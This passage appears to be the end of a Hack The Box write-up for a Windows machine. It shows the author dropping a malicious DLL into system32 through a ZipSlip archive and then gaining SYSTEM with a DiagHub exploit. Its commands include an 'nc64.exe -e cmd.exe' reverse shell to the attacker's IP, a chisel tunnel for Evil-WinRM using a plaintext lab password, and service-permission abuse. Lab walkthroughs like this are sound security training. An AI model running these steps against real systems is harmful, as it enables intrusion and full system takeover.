(v142)</li></ol></li><li>Rebuild</li></ol></li><li>Copy the Exploit on Target machine</li><li>ZipSlip attack to copy the malicious DLL within /windows/system32/ with admin privileges</li><li>diaghub exploit</li></ol><h3 id=zipslip-exploit-preparation>ZipSLip Exploit Preparation</h3><p>C:\windows\system32\ is not writeable by userpool, so we attempt zipslip by creating an evil zip with the tool <a href=https://github.com/ptoomey3/evilarc>evilarc on github</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git clone https://github.com/ptoomey3/evilarc
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>cd</span> evilarc
</span></span><span style=display:flex><span>python evilarc.py -f zipslip.zip -o win -p <span style=color:#f1fa8c>&#34;windows\system32&#34;</span> ~/htb/http/diaghub/FakeDll.dll
</span></span><span style=display:flex><span><span style=color:#6272a4>#Creating zipslip.zip containing ..\..\..\..\..\..\..\..\windows\system32\FakeDll.dll</span>
</span></span></code></pre></div><h3 id=delivery-of-exploit>Delivery of exploit</h3><p>Instead of copying each file individually with wget, we prefer to create a samba share with impacket</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#ff79c6>(</span>v3<span style=color:#ff79c6>)</span> _  diaghub <span style=color:#8be9fd;font-style:italic>pwd</span>
</span></span><span style=display:flex><span>/home/ctf/htb/http/diaghub
</span></span><span style=display:flex><span><span style=color:#ff79c6>(</span>v3<span style=color:#ff79c6>)</span> _  diaghub home/ctf/htb/v3/bin/smbserver.py -smb2support -username <span style=color:#8be9fd;font-style:italic>test</span> -password <span style=color:#8be9fd;font-style:italic>test</span> -port <span style=color:#bd93f9>8045</span> <span style=color:#8be9fd;font-style:italic>test</span> <span style=color:#ff79c6>$(</span><span style=color:#8be9fd;font-style:italic>pwd</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>bash: no such file or directory: home/ctf/htb/v3/bin/smbserver.py
</span></span><span style=display:flex><span><span style=color:#ff79c6>(</span>v3<span style=color:#ff79c6>)</span> _  diaghub /home/ctf/htb/v3/bin/smbserver.py -smb2support -username <span style=color:#8be9fd;font-style:italic>test</span> -password <span style=color:#8be9fd;font-style:italic>test</span> -port <span style=color:#bd93f9>8045</span> <span style=color:#8be9fd;font-style:italic>test</span> <span style=color:#ff79c6>$(</span><span style=color:#8be9fd;font-style:italic>pwd</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>Impacket v0.9.20 - Copyright <span style=color:#bd93f9>2019</span> SecureAuth Corporation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Config file parsed
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Callback added <span style=color:#ff79c6>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Callback added <span style=color:#ff79c6>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Config file parsed
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Config file parsed
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Config file parsed
</span></span></code></pre></div><p>Now copying files for our exploit is much easier</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; cp z:/json/diaghub/* .
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; cp z:/nc64.exe .
</span></span></code></pre></div><p>We upload all the files necessary for the exploit</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; ls
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:<span style=color:#f1fa8c>\P</span>rogramData
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>-a----        2/19/2020  11:52 PM         <span style=color:#bd93f9>141312</span> dh.exe
</span></span><span style=display:flex><span>-a----        2/19/2020  11:50 PM          <span style=color:#bd93f9>45272</span> nc64.exe
</span></span><span style=display:flex><span>-a----        2/20/2020  12:04 AM             <span style=color:#bd93f9>52</span> r.bat
</span></span><span style=display:flex><span>-a----        2/20/2020  12:01 AM         <span style=color:#bd93f9>500448</span> zipslip.zip
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt; net use z: <span style=color:#f1fa8c>\\</span>10.10.14.13<span style=color:#f1fa8c>\t</span>est /user:test <span style=color:#8be9fd;font-style:italic>test</span>
</span></span><span style=display:flex><span>The <span style=color:#8be9fd;font-style:italic>command</span> completed successfully.
</span></span></code></pre></div><h3 id=zipslip-attack>ZipSlip attack</h3><p>We launch our ZipSlip attack by copying our zip file into c:\proj_drop, then we control with cacls that the DLL is at the right location and belongs to NT Authority\system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; cp zipslip.zip /proj_drop/
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; ls /proj_drop
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; ls /windows/system32/Fak*
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>-a----        2/20/2020   4:50 AM         <span style=color:#bd93f9>124928</span> FakeDll.dll
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; cacls.exe c:/windows/system32/FakeDll.dll
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\F</span>akeDll.dll NT AUTHORITY<span style=color:#f1fa8c>\S</span>YSTEM:<span style=color:#ff79c6>(</span>ID<span style=color:#ff79c6>)</span>F
</span></span><span style=display:flex><span>                                BUILTIN<span style=color:#f1fa8c>\A</span>dministrators:<span style=color:#ff79c6>(</span>ID<span style=color:#ff79c6>)</span>F
</span></span><span style=display:flex><span>                                BUILTIN<span style=color:#f1fa8c>\U</span>sers:<span style=color:#ff79c6>(</span>ID<span style=color:#ff79c6>)</span>R
</span></span><span style=display:flex><span>                                APPLICATION PACKAGE AUTHORITY<span style=color:#f1fa8c>\A</span>LL APPLICATION PACKAGES:<span style=color:#ff79c6>(</span>ID<span style=color:#ff79c6>)</span>R
</span></span><span style=display:flex><span>                                APPLICATION PACKAGE AUTHORITY<span style=color:#f1fa8c>\A</span>LL RESTRICTED APPLICATION PACKAGES:<span style=color:#ff79c6>(</span>ID<span style=color:#ff79c6>)</span>R
</span></span></code></pre></div><p>The ZipSlip attack is successful, now we can try the Diagnostic Hub exploit.</p><h3 id=diaghub-attack>DiagHub attack</h3><p>We test the r.bat file and if successful, we lauch the Diaghub attack</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; ./r.bat
</span></span><span style=display:flex><span>C:<span style=color:#f1fa8c>\P</span>rogramData&gt;C:<span style=color:#f1fa8c>\P</span>rogramData<span style=color:#f1fa8c>\n</span>c64.exe -e cmd.exe 10.10.14.13 <span style=color:#bd93f9>8000</span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt; ./dh.exe FakeDll.dll
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Created dir:C:<span style=color:#f1fa8c>\P</span>rogramData<span style=color:#f1fa8c>\e</span>tw
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> CoCreateInstance
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> CoQueryProxyBlanket
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> CoSetProxyBlanket
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> service-&gt;CreateSession
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> service-&gt;AddAgent
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> DLL should have been loaded
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData&gt;
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>_  ~ rlwrap nc -lnvp <span style=color:#bd93f9>8000</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8000</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>61398</span>
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#ff79c6>[</span>Version 10.0.17763.107<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>(</span>c<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#f1fa8c>\P</span>rogramData&gt;exit
</span></span><span style=display:flex><span>_  ~ rlwrap nc -lnvp <span style=color:#bd93f9>8000</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8000</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>61404</span>
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#ff79c6>[</span>Version 10.0.17763.107<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>(</span>c<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#f1fa8c>\W</span>indows<span style=color:#f1fa8c>\s</span>ystem32&gt;whoami
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>nt authority<span style=color:#f1fa8c>\s</span>ystem
</span></span></code></pre></div><h1 id=evil-winrm--remote-desktop-connection>Evil-WinRM : Remote Desktop connection</h1><p>Downloading remote desktop <code>brew install microsoft-remote-desktop-beta</code> failed,
so we get it from the Apple Store &lsquo;Microsoft Remote Desktop 10&rsquo;.
Unfortunately I am not successful to connect with remote desktop connection.
Indeed port 5985 was not in our initial nmap, therefore it may be blocked by firewall.
We should be able to reverse forward this port on our local machine using <code>chisel</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt; netstat -an | findstr LIST
</span></span><span style=display:flex><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    10.10.10.144:139       0.0.0.0:0              LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:80                <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:135               <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:445               <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:5985              <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:47001             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:49664             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:49665             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:49666             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:49667             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:49668             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span><span style=display:flex><span>  TCP    <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:49669             <span style=color:#ff79c6>[</span>::<span style=color:#ff79c6>]</span>:0                 LISTENING
</span></span></code></pre></div><p>We install chisel on Linux, with some flags to reduce the size of the binary</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt; <span style=color:#8be9fd;font-style:italic>cd</span> /ProgramData/chisel
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogramData<span style=color:#f1fa8c>\c</span>hisel&gt; ./chisel.exe client 10.10.14.13:8002 R:5985:127.0.0.1:5985
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>git clone https://github.com/jpillora/chisel
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>cd</span> chisel
</span></span><span style=display:flex><span>sudo go build -ldflags<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;-s -w&#34;</span>
</span></span></code></pre></div><p>And we start the server on port 8085 after forwarding it to our container <code>ssh username@localhost -L $HTB:5985:192.168.99.100:8085</code></p><p>We start as well a client, on the target machine</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>_  chisel git:<span style=color:#ff79c6>(</span>master<span style=color:#ff79c6>)</span> ./chisel server --host 0.0.0.0 --port <span style=color:#bd93f9>8002</span> --reverse
</span></span><span style=display:flex><span>2020/02/20 09:29:47 server: Reverse tunnelling enabled
</span></span><span style=display:flex><span>2020/02/20 09:29:47 server: Fingerprint f7:d5:5e:dc:9f:94:b8:6d:fa:0f:89:f8:d9:c6:04:9d
</span></span><span style=display:flex><span>2020/02/20 09:29:47 server: Listening on 0.0.0.0:8002...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>2020/02/20 09:30:05 server: proxy#1:R:0.0.0.0:5985<span style=color:#ff79c6>=</span>&gt;127.0.0.1:5985: Listening
</span></span></code></pre></div><p>We have a proxy connection established on our local port 5985</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>_  htb ss -lntp | egrep <span style=color:#f1fa8c>&#34;5985&#34;</span>
</span></span><span style=display:flex><span>LISTEN   <span style=color:#bd93f9>0</span>         <span style=color:#bd93f9>0</span>                   0.0.0.0:5985             0.0.0.0:*        users:<span style=color:#ff79c6>((</span><span style=color:#f1fa8c>&#34;chisel&#34;</span>,pid<span style=color:#ff79c6>=</span>2748,fd<span style=color:#ff79c6>=</span>6<span style=color:#ff79c6>))</span>
</span></span></code></pre></div><p>We can now attempt the evil-WinRM</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>_  evil-winrm git:<span style=color:#ff79c6>(</span>master<span style=color:#ff79c6>)</span> _ ruby ./evil-winrm.rb -i localhost -P <span style=color:#bd93f9>5985</span> -u coby -p championship2005
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Evil-WinRM shell v2.3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\c</span>oby<span style=color:#f1fa8c>\D</span>ocuments&gt; whoami
</span></span><span style=display:flex><span>re<span style=color:#f1fa8c>\c</span>oby
</span></span></code></pre></div><p>Awesome</p><h1 id=further-exploration>Further exploration</h1><h2 id=program-installed>program installed</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\c</span>oby<span style=color:#f1fa8c>\D</span>ocuments&gt; ls /<span style=color:#f1fa8c>&#34;Program Files&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory: C:<span style=color:#f1fa8c>\P</span>rogram Files
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>d-----        3/14/2019  10:48 AM                Java
</span></span><span style=display:flex><span>d-----        3/13/2019   6:47 PM                LibreOffice
</span></span><span style=display:flex><span>d-----        3/14/2019   5:13 AM                Notepad++
</span></span><span style=display:flex><span>d-----        3/20/2019   2:11 PM                PeaZip
</span></span><span style=display:flex><span>d-----        3/14/2019   6:35 AM                Sysinternals
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop&gt; download root.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: Remember that in docker environment all <span style=color:#8be9fd;font-style:italic>local</span> paths should be at /data and it must be mapped correctly as a volume on docker run <span style=color:#8be9fd;font-style:italic>command</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Info: Downloading C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop<span style=color:#f1fa8c>\r</span>oot.txt to root.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Info: Download successful!
</span></span></code></pre></div><p>That&rsquo;s super handy</p><h2 id=sysinternals>Sysinternals</h2><p>With other users, we are not able to control the services privileges; However, the user iis belongs to SVCManager group</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\S</span>ysinternals&gt; whoami
</span></span><span style=display:flex><span>iis apppool<span style=color:#f1fa8c>\r</span>e
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\S</span>ysinternals&gt; whoami /groups
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GROUP INFORMATION
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Group Name                           Type             SID          <span style=color:#8be9fd;font-style:italic>Attributes</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>====================================</span> <span style=color:#ff79c6>================</span> <span style=color:#ff79c6>============</span> <span style=color:#ff79c6>==================================================</span>
</span></span><span style=display:flex><span>Mandatory Label<span style=color:#f1fa8c>\H</span>igh Mandatory Level Label            S-1-16-12288
</span></span><span style=display:flex><span>Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>BUILTIN<span style=color:#f1fa8c>\U</span>sers                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>NT AUTHORITY<span style=color:#f1fa8c>\S</span>ERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>NT AUTHORITY<span style=color:#f1fa8c>\A</span>uthenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>NT AUTHORITY<span style=color:#f1fa8c>\T</span>his Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>BUILTIN<span style=color:#f1fa8c>\I</span>IS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>                                     Unknown SID <span style=color:#8be9fd;font-style:italic>type</span> S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\S</span>ysinternals&gt; .<span style=color:#f1fa8c>\a</span>ccesschk -accepteula -uvwc *
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>UsoSvc
</span></span><span style=display:flex><span>  Medium Mandatory Level <span style=color:#ff79c6>(</span>Default<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>No-Write-Up<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>  RW NT AUTHORITY<span style=color:#f1fa8c>\S</span>YSTEM
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>  RW NT AUTHORITY<span style=color:#f1fa8c>\S</span>ERVICE
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span></code></pre></div><p>We can abuse this service at will.</p></div></article><hr><div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><span class=tag><a href=https://0xade1.github.io/series/htb/>htb</a></span><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><span class=tag><a href=https://0xade1.github.io/categories/htb-windows/>htb-windows</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>5311 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2020-02-19</p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%20-%20Re&amp;caption=HTB%20-%20Re&amp;canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_blank rel=noopener aria-label title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 